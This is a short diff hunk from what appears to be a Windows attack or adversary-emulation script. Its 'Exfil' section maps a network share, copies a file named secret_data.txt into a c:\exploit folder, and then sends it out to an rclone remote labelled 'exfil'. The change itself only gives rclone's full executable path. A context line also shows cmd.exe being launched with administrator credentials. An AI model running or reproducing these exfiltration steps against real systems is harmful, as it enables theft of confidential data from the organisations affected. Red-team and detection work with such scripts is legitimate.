@@ -63,5 +63,5 @@ Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c c:\expl
 "Exfil"
 net use w: \\dcontent\exploit
 xcopy  w:\secret_data.txt c:\exploit\ /E /y
-rclone copy c:\exploit\secret_data.txt remote:exfil
+c:\exploit\rclone.exe copy c:\exploit\secret_data.txt remote:exfil
 
